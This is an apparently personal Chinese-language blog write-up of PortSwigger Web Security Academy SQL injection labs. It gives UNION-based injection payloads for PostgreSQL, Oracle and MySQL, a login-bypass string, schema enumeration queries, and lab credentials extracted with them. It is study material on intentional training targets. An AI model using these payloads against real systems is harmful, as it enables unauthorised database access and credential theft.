@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PortSwigger打靶随记 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>PortSwigger打靶随记</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-07-11T04:58:22.000Z" id="date"> 2023-07-11</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-07-22T09:04:41.939Z" id="updated"> 2023-07-22</time></div></span></div></div><hr><div id="post-content"><p>这篇文章来打burp官方提供的portswigger的部分靶场</p>
+<span id="more"></span>
+
+<h1 id="postgresql注入"><a href="#postgresql注入" class="headerlink" title="postgresql注入"></a>postgresql注入</h1><p>点进去是商品订购界面，随便点进去一个，查看url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/product?productId=7<br></code></pre></td></tr></table></figure>
+
+<p>注入不就来了吗？但是这里又遇到了一个问题—-&gt;判断不出闭合？</p>
+<p>单引号双引号 and 1&#x3D;1 and 1&#x3D;2 都是一个报错页面：<code>&quot;Invalid product ID&quot;</code></p>
+<p>难道注入的点不是在这里？回到主界面再试试看，发现还有一个category的参数传递的点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/filter?category=Accessories<br></code></pre></td></tr></table></figure>
+
+<p>尝试注入，，，成功测试出注入点！</p>
+<ol>
+<li><p>闭合 单引号</p>
+</li>
+<li><p>字段数：8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Accessories&#x27; order by 8--+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>尝试联合查询获取回显点，，失败，尝试报错注入，，还是失败，，尝试布尔盲注</p>
+<p>这个倒是成功了，有不同的页面</p>
+<p>但是布尔盲注过于麻烦，这里不记录了，这里尝试新的注入方法：sqlmap万能注入😏</p>
+<p class='item-img' data-src='/1.png'><img src="/1.png"></p>
+</li>
+</ol>
+<p>原来是postgresql数据库类型，暂时退下sqlmap，看着上次梳理的文章实操一下吧</p>
+<p>注出回显点:</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,null,null,null,null,null,null,null--+</span><br></code></pre></td></tr></table></figure>
+
+<p>然后判断每一位的数据类型，一位一位的替换：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27;,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>
+
+<p>​	界面的回显点是null2，然后我们获取数据库：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,current_database(),null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
+
+<p>得到当前数据库名是<code>academy_labs</code></p>
+<p>然后查表名：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,tablename,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from pg_tables where schemaname=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>
+
+<p>得到当前表名是<code>products</code>，然后获取列名：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,column_name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from information_schema.columns where table_schema=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>products<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
+
+<p>获取出了列名：</p>
+<p><code>id category name rating price image released description</code></p>
+<p>然后dump全部内容：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,price||&#x27;</span>::<span class="hljs-string">&#x27;||name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from public.products--+</span><br></code></pre></td></tr></table></figure>
+
+<p>这里就只挑选两列的内容吧，成功dump全部：</p>
+<p class='item-img' data-src='/2.png'><img src="/2.png"></p>
+<p>成功！完美</p>
+<p>这一次的主要关键点是对于数据库类型的判断，需要借助sqlmap来判断数据库类型以进行注入语句的选择</p>
+<h1 id="登录框sql注入绕过"><a href="#登录框sql注入绕过" class="headerlink" title="登录框sql注入绕过"></a>登录框sql注入绕过</h1><p>相比前面一关，这一关似乎没有了category的这个选项，也就是说我们需要从其他地方找注入点</p>
+<p>购物商品的id应该是注入不了，看这个靶场的标题，应该是登录框下的post注入，我们看到有一个MyAccount选项，看来就是这个了</p>
+<p>构造万能密码：<code>admin&#39; or 1=1 --+</code></p>
+<p>发现提示用户名名有问题，后来又看了好久也不知道问题在哪里。。就算是postgresql数据库也不应该出现问题</p>
+<p>看了以下官方给出的solution，原来这里的用户名是administrator！</p>
+<p>因此我们的万能密码应该是<code>administratror&#39; or 1=1--</code></p>
+<p>这里又抱着尝试的心理想试试看<code>&#39; or 1=1--+</code>这个万能密码可不可以用，结果发现是可以的！</p>
+<h1 id="orancle注入"><a href="#orancle注入" class="headerlink" title="orancle注入"></a>orancle注入</h1><p>这一关提示是orancle数据库了</p>
+<ol>
+<li><p>判断闭合—&gt;单引号，和MySQL一样</p>
+</li>
+<li><p>判断字字段数—&gt;2，和MySQL一样</p>
+</li>
+<li><p>注出回显点</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Pets<span class="hljs-string">&#x27; union all select &#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>
+
+<p>两个都是字符类型的并且都有回显</p>
+</li>
+<li><p>获取用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Gifts<span class="hljs-string">&#x27; union all select user,&#x27;</span>null114514<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>通过用户名获取全部表名，这个是最高效的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (select LISTAGG(table_name,&#x27;</span>,<span class="hljs-string">&#x27;)within group(order by owner)name from all_tables where owner=&#x27;</span>PETER<span class="hljs-string">&#x27;),&#x27;</span>null114514<span class="hljs-string">&#x27; from dual --</span><br></code></pre></td></tr></table></figure>
+
+<p>法二</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select table_name,&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tables where rownum=1 --</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取表中的列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; --</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用获取到的列名一步一步往下推</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>CATEGORY<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>NAME<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RATING<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>PRICE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>IMAGE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RELEASED<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>DESCRIPTION<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>
+
+<p>到这一步没有更多的回显了就是没有更多的列名了</p>
+</li>
+<li><p>dump全部内容</p>
+<p>postgresql没有MySQL那样方便的group_concat()函数，只能一步一步的自己手动推</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select DESCRIPTION,&#x27;</span>null114514<span class="hljs-string">&#x27; from PRODUCTS --</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<p>至此，这个靶场完美结束！</p>
+<h1 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h1><p>MySQL数据库是吧，，，五分钟拿下！</p>
+<ol>
+<li><p>判断闭合 单引号</p>
+</li>
+<li><p>判断字段数 2</p>
+</li>
+<li><p>注出回显点 1 2都是回显点</p>
+</li>
+<li><p>获取数据库内表名 <code>products</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名内列名 <code>category,description,id,image,name,price,rating,released</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;products&#x27;--+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取全部数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(category,description,id,image,name,price,rating,released) from products--+<br></code></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<p>到这一步，已经结束了，总共耗时5分钟，但是出来以后看靶场依旧显示没有通关？</p>
+<p>回靶场又看了看，发现顶部有一个提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Make the database retrieve the string: &#x27;8.0.33-0ubuntu0.20.04.2&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>那就是把payload换成这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=-Pets&#x27; union select 1,&#x27;8.0.33-0ubuntu0.20.04.2&#x27;--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="postgresql注入2"><a href="#postgresql注入2" class="headerlink" title="postgresql注入2"></a>postgresql注入2</h1><p>这一关新出现了一个登录框，看来这一关是需要bypass login</p>
+<p>这一关的题目描述告诉我们应该先获取到数据库中的表中内容，然后就可以使用数据库中的表的内容成功登录，因此我们先使用第一关的注入方式重新注入一遍</p>
+<p>步骤就省略了，总之，最后的一步的payload是：</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=-Gifts<span class="hljs-string">&#x27; union select username_ucniul,password_yzwmyg from users_ckreei --+</span><br></code></pre></td></tr></table></figure>
+
+<p>得到的数据就包含了我们需要的用户和密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	dl98o3trorz7cskbaguh<br>carlos<br>	qc4qisc9ndlsyjjs60nq<br>wiener<br>	34gdu60zq3tp7stmej8n<br></code></pre></td></tr></table></figure>
+
+<p>最终，成功登录！</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></p>
+<p>（给自己留个参考资料）</p>
+</blockquote>
+<h1 id="orancle注入2"><a href="#orancle注入2" class="headerlink" title="orancle注入2"></a>orancle注入2</h1><p>和上面一关差不多，只是换了一个数据库类型</p>
+<p>前面的步骤直接略，最后获取到的内容：</p>
+<p>用户名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	2<br>carlos<br>	2<br>wiener<br>	2<br></code></pre></td></tr></table></figure>
+
+<p>密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2g8dqtbv9r0cek01r42y<br>	2<br>2ohduxnb1fdr59afvpiq<br>	2<br>ojqq1ah94210ymhe83k2<br>	2<br></code></pre></td></tr></table></figure>
+
+<p>成功登录了，这个靶场也是完美结束了！</p>
+<h1 id="sql联合注入"><a href="#sql联合注入" class="headerlink" title="sql联合注入"></a>sql联合注入</h1><p>这一关毫无难度，我在测试数据库类型的时候就直接通关了，通关payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select null,null,null --+<br></code></pre></td></tr></table></figure>
+
+<p>猜测是postgresql数据库类型</p>
+<h1 id="sql联合注入2"><a href="#sql联合注入2" class="headerlink" title="sql联合注入2"></a>sql联合注入2</h1><p>这一干也和上面一关一样，只是需要你找到其中的字符型回显位并输入指定的内容，只要数据库接受到了这个指定的字符，就通关了，具体的试数据类型可以看上面的postgresql注入</p>
+<p>paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Pets&#x27; union all select null,&#x27;MsJjXo&#x27;,null--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="sql联合注入3"><a href="#sql联合注入3" class="headerlink" title="sql联合注入3"></a>sql联合注入3</h1><p>同上面的章节《postgresql注入2》</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select username,password from users--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="sql联合注入4"><a href="#sql联合注入4" class="headerlink" title="sql联合注入4"></a>sql联合注入4</h1><p>这一关和上面一关唯一的不同就是这一关的回显位置从1 2 都是变成了只有2是回显位置</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select &#x27;1&#x27;,username||&#x27;:&#x27;||password from users--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p>盲注的靶场全部跳过，直接去看官方给出的writeup吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">靶场Blind SQL injection with conditional responses的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses<br><br>靶场Blind SQL injection with conditional errors的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>
+
+<p>后面的很多靶场略，都在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
+<h1 id="sql报错注入"><a href="#sql报错注入" class="headerlink" title="sql报错注入"></a>sql报错注入</h1><p>报错注入也同样跳过吧，暂时用不到</p>
+<p>如果遇到了那么bp官方的wt就是非常详细了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">靶场Visible error-based SQL injection的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based<br><br>靶场Blind SQL injection with conditional errors的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>
+
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这篇文章仅仅只是记录了sql注入的部分，剩下的靶场都已经在其他的靶场学习过便不记录了</p>
+<p>这篇文章的主要内容就是MySQL之外的数据库类型的基本注入语句，给未来的我或为数不多的读者一个参考！</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/05/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/">各种数据库类型sql注入 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#postgresql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">postgresql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%A1%86sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">登录框sql注入绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orancle%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">orancle注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">mysql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#postgresql%E6%B3%A8%E5%85%A52"><span class="toc-number">5.</span> <span class="toc-text">postgresql注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orancle%E6%B3%A8%E5%85%A52"><span class="toc-number">6.</span> <span class="toc-text">orancle注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">sql联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A52"><span class="toc-number">8.</span> <span class="toc-text">sql联合注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A53"><span class="toc-number">9.</span> <span class="toc-text">sql联合注入3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A54"><span class="toc-number">10.</span> <span class="toc-text">sql联合注入4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">sql盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">sql报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">13.</span> <span class="toc-text">最后</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: '此条评论委托企鹅物流发送'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
